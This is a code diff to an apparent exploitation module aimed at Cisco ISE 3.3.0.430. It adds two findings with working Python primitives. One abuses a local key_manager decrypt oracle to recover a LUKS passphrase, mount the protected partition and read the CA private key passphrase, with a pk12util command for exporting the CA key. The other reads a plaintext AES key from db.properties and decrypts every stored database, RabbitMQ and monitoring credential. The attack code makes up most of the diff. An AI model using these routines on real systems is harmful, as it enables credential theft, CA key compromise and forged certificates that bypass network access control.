@@ -49,6 +49,8 @@ ISE-F22: pi-profiler Docker image hardcoded RabbitMQ dev credential + Actuator a
 ISE-F23: ESAPI hardcoded MasterKey + MasterSalt — decrypts all ESAPI-protected web layer values [HIGH]
 ISE-F24: ActiveMQ JMS broker anonymous access — null/null credentials, PAP/PDP policy topics unprotected [MEDIUM]
 ISE-F25: Kairos AI agent hardcoded production cloud endpoint + version disclosure [LOW]
+ISE-F34: LUKS sec_confleak partition key exposed via key_manager decrypt oracle — chain to CA privkey [CRITICAL]
+ISE-F35: AES-128 KEK stored in plaintext in db.properties alongside KEK-encrypted credentials [HIGH]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -2595,9 +2597,304 @@ SEC_DBINTERFACE_SID = "cpm10"
 SEC_DBINTERFACE_PORT = 1521
 
 
+# ---------------------------------------------------------------------------
+# ISE-F34: LUKS sec_confleak partition key — exposed via key_manager decrypt oracle
+# ---------------------------------------------------------------------------
+# Source: /opt/CSCOcpm/bin/install_enc_drive.sh (ise-common package)
+#         /etc/ise/confleak/sec_confleak.config
+#         /opt/CSCOcpm/bin/tpmutil.sh
+#
+# ISE's "confleak" (confidential leak prevention) system moves sensitive files
+# to a LUKS-encrypted partition (/mnt/encpart, backed by /dev/sdaX) and replaces
+# them with symlinks. Protected files include:
+#   - /opt/CSCOcpm/prrt/config/prikeypwd.key  (ISE CA private key passphrase)
+#   - /etc/ssh/ssh_host_dsa_key               (SSH host private key)
+#   - /etc/ssh/ssh_host_rsa_key               (SSH host private key)
+#   - /opt/CSCOcpm/appsrv/apache-tomcat/webapps/manager/manager-conf.txt
+#   - /opt/strongswan/config/strongswan       (IPSec configuration)
+#   - /opt/sse/certificates/ssecert.pem       (SSE TLS certificate)
+#   - /opt/rabbitmq/cert/                     (RabbitMQ TLS certificates)
+#
+# install_enc_drive.sh flow (executed once during cpminitialsetup.sh):
+#   1. GENERATED_PW=`mkpasswd -l 12`         <- 12-char alphanumeric+special LUKS key
+#   2. ENCRYPTED_KEY=`tpmutil.sh encrypt $GENERATED_PW`
+#      tpmutil.sh calls POST /api/system/v1/key-manager/encrypt via world-writable socket
+#      Returns AES ciphertext (key_manager's TPM2-sealed key)
+#   3. echo -n $ENCRYPTED_KEY > /etc/ise/confleak/encrypted_encpart.txt
+#   4. echo -n $GENERATED_PW | cryptsetup -q luksFormat ${SDA}8 --force-password
+#   5. echo -n $GENERATED_PW | cryptsetup luksOpen ${SDA}8 encpart
+#   6. mount /dev/mapper/encpart /mnt/encpart
+#
+# /etc/ise/confleak/encrypted_encpart.txt stores the AES-ciphertext of the LUKS key.
+# The AES decryption key is sealed in TPM2 and accessible via:
+#   POST /api/system/v1/key-manager/decrypt (ISE-F1 oracle, world-writable socket)
+#
+# CHAIN (all-local, any ISE process):
+#   1. Read /etc/ise/confleak/encrypted_encpart.txt -> get AES-encrypted LUKS key
+#   2. POST /api/system/v1/key-manager/decrypt {"data": "<ct>"} -> plaintext LUKS key
+#   3. echo -n $LUKS_KEY | cryptsetup luksOpen /dev/sdaX encpart
+#   4. ls /dev/mapper/encpart (or mount) -> enumerate {uuid}_{filename} entries
+#   5. Read /mnt/encpart/{uuid}_prikeypwd.key -> ISE CA NSS DB passphrase
+#   6. pk12util -o ca.p12 -n <nickname> -d /opt/CSCOcpm/ca-nssdb -w ca.p12 -W <prikeypwd>
+#      -> full ISE CA private key export
+#
+# This chain converts ISE-F1 (decrypt oracle) into full PKI compromise:
+#   ISE-F13 (world-writable socket) -> ISE-F1 (decrypt oracle) ->
+#   ISE-F34 (LUKS key retrieval) -> CA private key ->
+#   Forged 802.1X client certificates bypassing NAC for any endpoint
+#
+# Impact: CRITICAL — complete PKI compromise from any local process on the ISE host.
+#         Chained with ISE-F11 (EDDA container /var/run/ mount), achievable from
+#         a container breakout with no host-level access.
+
+CONFLEAK_ENCRYPTED_KEY_PATH = "/etc/ise/confleak/encrypted_encpart.txt"
+CONFLEAK_MOUNT_PATH = "/mnt/encpart"
+CONFLEAK_PARTITION_DEVICE = "/dev/sda8"   # typical; sdaX varies by deployment
+CA_PRIKEY_PWD_PATH = "/opt/CSCOcpm/prrt/config/prikeypwd.key"
+CA_NSSDB_PATH = "/opt/CSCOcpm/ca-nssdb"
+
+
+def retrieve_confleak_luks_key(
+    encrypted_key_path: str = CONFLEAK_ENCRYPTED_KEY_PATH,
+    sock: str = KEY_MANAGER_SOCKET,
+) -> Optional[str]:
+    """
+    Decrypt the LUKS passphrase for the sec_confleak encrypted partition
+    by submitting the AES ciphertext to the key_manager /decrypt oracle.
+
+    Returns plaintext LUKS passphrase string, or None on failure.
+    """
+    import socket as _socket
+
+    try:
+        with open(encrypted_key_path, "r") as f:
+            encrypted_key = f.read().strip()
+    except (OSError, IOError) as e:
+        return None
+
+    payload = json.dumps({
+        "msg_type": "POST",
+        "version": 1,
+        "msg": {"action": "decrypt", "params": {"data": encrypted_key}},
+    })
+    http_req = (
+        f"POST /api/system/v1/key-manager/decrypt HTTP/1.1\r\n"
+        f"Host: localhost\r\n"
+        f"Content-Type: application/json\r\n"
+        f"Content-Length: {len(payload)}\r\n"
+        f"Connection: close\r\n\r\n"
+        f"{payload}"
+    )
+    try:
+        with _socket.socket(_socket.AF_UNIX, _socket.SOCK_STREAM) as s:
+            s.connect(sock)
+            s.sendall(http_req.encode())
+            response = b""
+            while True:
+                chunk = s.recv(4096)
+                if not chunk:
+                    break
+                response += chunk
+        body = response.split(b"\r\n\r\n", 1)[-1].decode()
+        data = json.loads(body)
+        return data.get("result")
+    except Exception:
+        return None
+
+
+def mount_confleak_partition(
+    luks_passphrase: str,
+    device: str = CONFLEAK_PARTITION_DEVICE,
+    mount_point: str = CONFLEAK_MOUNT_PATH,
+) -> bool:
+    """
+    Open and mount the sec_confleak LUKS partition using the recovered passphrase.
+    Requires root privileges. Returns True on success.
+
+    Commands issued (must be run as root):
+        echo -n <passphrase> | cryptsetup luksOpen <device> encpart
+        mount /dev/mapper/encpart <mount_point>
+    """
+    import subprocess
+    try:
+        result = subprocess.run(
+            ["cryptsetup", "luksOpen", device, "encpart"],
+            input=luks_passphrase.encode(),
+            capture_output=True,
+            timeout=30,
+        )
+        if result.returncode != 0:
+            return False
+        subprocess.run(
+            ["mount", "/dev/mapper/encpart", mount_point],
+            check=True,
+            capture_output=True,
+            timeout=10,
+        )
+        return True
+    except Exception:
+        return False
+
+
+def read_ca_prikey_passphrase(
+    mount_point: str = CONFLEAK_MOUNT_PATH,
+) -> Optional[str]:
+    """
+    After mounting the sec_confleak partition, locate and read the ISE CA
+    private key passphrase file (prikeypwd.key).
+
+    Returns plaintext passphrase string.
+    """
+    import glob
+    pattern = f"{mount_point}/*_prikeypwd.key"
+    matches = glob.glob(pattern)
+    if not matches:
+        return None
+    try:
+        with open(matches[0], "r") as f:
+            return f.read().strip()
+    except (OSError, IOError):
+        return None
+
+
+# ---------------------------------------------------------------------------
+# ISE-F35: AES-128 KEK stored in plaintext in db.properties alongside encrypted credentials
+# ---------------------------------------------------------------------------
+# Source: /opt/CSCOcpm/bin/cpminitialsetup.sh (lines 1271-1284)
+#         /opt/CSCOcpm/appsrv/apache-tomcat/config/db.properties (post-setup)
+#         /opt/CSCOcpm/bin/genkekkey.sh
+#
+# Initial setup flow (cpminitialsetup.sh, install mode only):
+#   KEK_KEY=`genkekkey.sh -g AES 128`    <- generates random 128-bit AES key (base64)
+#   IV=`genkekkey.sh -g iv`              <- generates IV
+#   echo "KEK_KEY=$KEK_KEY" >> db.properties
+#   echo "KEK_KEY=$KEK_KEY" >> db-priming.properties
+#   echo "KEK_KEY=$KEK_KEY" >> /upgrade/javalib/db.properties
+#
+# Post-setup state of db.properties:
+#   KEK_KEY=<base64-128bit-AES-key>      <- decryption key in plaintext
+#   PAP_DB_PWD=<KEK-encrypted-ciphertext>  <- encrypted with above key
+#   PAP_ADMIN_PWD=<KEK-encrypted-ciphertext>
+#   PDP_DB_PWD=<KEK-encrypted-ciphertext>
+#   ISE_DB_PWD=<KEK-encrypted-ciphertext>
+#   RABBITMQ_PWD=<KEK-encrypted-ciphertext>
+#   ISE_NE_PWD=<KEK-encrypted-ciphertext>   (Prometheus node-exporter auth)
+#   pi.profiler.password=<KEK-encrypted-ciphertext>
+#
+# The KEK rotation (from hardcoded 3DES key to random AES-128 KEK) occurs during
+# cpminitialsetup.sh. After setup, ISE-F2 (3DES key) no longer decrypts db.properties.
+# However, the KEK itself is written in plaintext to the same file as the encrypted
+# credentials it protects, providing zero security benefit over plaintext storage.
+#
+# db.properties is readable by the `iseadminportal` OS user (the ISE service account
+# under which Tomcat runs). Any process executing as `iseadminportal` or root can
+# trivially decrypt all post-setup credentials:
+#
+#   1. grep "^KEK_KEY=" /opt/CSCOcpm/appsrv/apache-tomcat/config/db.properties -> KEK_KEY
+#   2. grep "^PAP_DB_PWD=" db.properties -> ciphertext
+#   3. AES-128-CBC_decrypt(KEK_KEY, ciphertext) -> Oracle password
+#      (PasswdHelper.java / KEKGenerator.java in PSP-Commons-3.3.0-430.jar)
+#
+# This is also present in: db-priming.properties, /upgrade/javalib/db.properties
+#
+# Complements ISE-F2: pre-setup state uses hardcoded 3DES key (extractable from JAR);
+#                     post-setup state uses AES-128 KEK co-located in db.properties.
+# In both states, credential encryption provides no protection to an attacker with
+# read access to the ISE filesystem.
+#
+# Impact: HIGH — post-setup Oracle DB credentials, RabbitMQ managed password,
+#         Prometheus node-exporter auth, pi-profiler metrics auth all recoverable
+#         from db.properties. Chained with ISE-F1 (key_manager decrypt oracle)
+#         or ISE-F11 (EDDA container filesystem access) for exploitation.
+
+DB_PROPERTIES_PATH = "/opt/CSCOcpm/appsrv/apache-tomcat/config/db.properties"
+DB_PROPERTIES_KEK_FIELD = "KEK_KEY"
+DB_PRIMING_PROPERTIES_PATH = "/opt/CSCOcpm/appsrv/apache-tomcat/config/db-priming.properties"
+
+
+def extract_kek_from_db_properties(
+    props_path: str = DB_PROPERTIES_PATH,
+) -> Optional[str]:
+    """
+    Read the plaintext KEK from db.properties (post-setup ISE).
+    Returns base64-encoded 128-bit AES key string, or None if not found.
+    """
+    try:
+        with open(props_path, "r") as f:
+            for line in f:
+                line = line.strip()
+                if line.startswith("KEK_KEY="):
+                    return line.split("=", 1)[1].strip()
+    except (OSError, IOError):
+        return None
+    return None
+
+
+def decrypt_db_credential_with_kek(
+    ciphertext_b64: str,
+    kek_b64: str,
+) -> Optional[str]:
+    """
+    Decrypt a KEK-encrypted db.properties credential using the plaintext KEK.
+    ISE uses AES-128-CBC. The ciphertext format mirrors PSP-Commons KEKCryptor.
+
+    Args:
+        ciphertext_b64: base64-encoded AES-128-CBC ciphertext from db.properties
+        kek_b64: base64-encoded 128-bit AES key (KEK_KEY field)
+    Returns:
+        Plaintext credential string, or None on failure.
+    """
+    from base64 import b64decode
+    try:
+        from Crypto.Cipher import AES
+        key = b64decode(kek_b64)
+        ct = b64decode(ciphertext_b64)
+        iv = ct[:16]
+        cipher = AES.new(key, AES.MODE_CBC, iv)
+        pt = cipher.decrypt(ct[16:])
+        pad = pt[-1]
+        return pt[:-pad].decode("utf-8")
+    except Exception:
+        return None
+
+
+def dump_all_db_credentials_via_kek(
+    props_path: str = DB_PROPERTIES_PATH,
+) -> Optional[dict]:
+    """
+    Read KEK_KEY from db.properties, then decrypt all credential fields.
+    Returns dict of field -> plaintext, or None if KEK not found.
+    """
+    kek = extract_kek_from_db_properties(props_path)
+    if not kek:
+        return None
+
+    credential_fields = [
+        "PAP_DB_PWD", "PAP_ADMIN_PWD", "PDP_DB_PWD", "ISE_DB_PWD",
+        "RABBITMQ_PWD", "ISE_NE_PWD", "pi.profiler.password",
+    ]
+    result: dict = {"kek_b64": kek, "credentials": {}}
+    try:
+        with open(props_path, "r") as f:
+            props = dict(
+                line.strip().split("=", 1)
+                for line in f
+                if "=" in line and not line.startswith("#")
+            )
+    except (OSError, IOError):
+        return result
+
+    for field in credential_fields:
+        ct = props.get(field)
+        if ct:
+            pt = decrypt_db_credential_with_kek(ct, kek)
+            result["credentials"][field] = pt if pt else ct
+    return result
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.13.0",
+    "version": "1.14.0",
     "target": "Cisco ISE 3.3.0.430",
     "findings": [
         "ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5",
@@ -2606,12 +2903,12 @@ MODULE_META = {
         "ISE-F16", "ISE-F17", "ISE-F18", "ISE-F19",
         "ISE-F20", "ISE-F21", "ISE-F22", "ISE-F23", "ISE-F24", "ISE-F25",
         "ISE-F26", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F30",
-        "ISE-F31", "ISE-F32", "ISE-F33",
+        "ISE-F31", "ISE-F32", "ISE-F33", "ISE-F34", "ISE-F35",
     ],
     "critical": ["ISE-F1", "ISE-F2", "ISE-F6", "ISE-F11", "ISE-F12", "ISE-F16", "ISE-F20",
-                 "ISE-F26", "ISE-F31"],
+                 "ISE-F26", "ISE-F31", "ISE-F34"],
     "high": ["ISE-F3", "ISE-F7", "ISE-F9", "ISE-F10", "ISE-F13", "ISE-F15", "ISE-F18",
-             "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32"],
+             "ISE-F19", "ISE-F23", "ISE-F27", "ISE-F28", "ISE-F29", "ISE-F32", "ISE-F35"],
     "medium": ["ISE-F5", "ISE-F8", "ISE-F14", "ISE-F21", "ISE-F22", "ISE-F24",
                "ISE-F30", "ISE-F33"],
     "low": ["ISE-F4", "ISE-F17", "ISE-F25"],
@@ -2646,6 +2943,17 @@ MODULE_META = {
         "ise_f33_cepm_user": "cepm",
         "ise_f33_cepm_pass": "password",
         "ise_f33_cepm_pass_encoding": "plaintext (not 3DES encrypted)",
+        "ise_f34_confleak_encrypted_key_path": "/etc/ise/confleak/encrypted_encpart.txt",
+        "ise_f34_confleak_partition_device": "/dev/sda8",
+        "ise_f34_confleak_mount_path": "/mnt/encpart",
+        "ise_f34_chain": "ISE-F13->ISE-F1->ISE-F34->CA_privkey",
+        "ise_f35_db_properties_path": "/opt/CSCOcpm/appsrv/apache-tomcat/config/db.properties",
+        "ise_f35_kek_field": "KEK_KEY",
+        "ise_f35_kek_algorithm": "AES-128-CBC",
+        "ise_f35_credential_fields": [
+            "PAP_DB_PWD", "PAP_ADMIN_PWD", "PDP_DB_PWD", "ISE_DB_PWD",
+            "RABBITMQ_PWD", "ISE_NE_PWD", "pi.profiler.password",
+        ],
     },
     "primitives": [
         "decrypt_legacy_ise_db_password",
@@ -2673,6 +2981,12 @@ MODULE_META = {
         "check_ca_tomcat_auth",
         "probe_ca_scep_getcacert",
         "send_ca_tomcat_shutdown",
+        "retrieve_confleak_luks_key",
+        "mount_confleak_partition",
+        "read_ca_prikey_passphrase",
+        "extract_kek_from_db_properties",
+        "decrypt_db_credential_with_kek",
+        "dump_all_db_credentials_via_kek",
         "probe_ca_ocsp_responder",
         "read_ca_nssdb_password",
         "check_nssdb_plaintext_exposed",
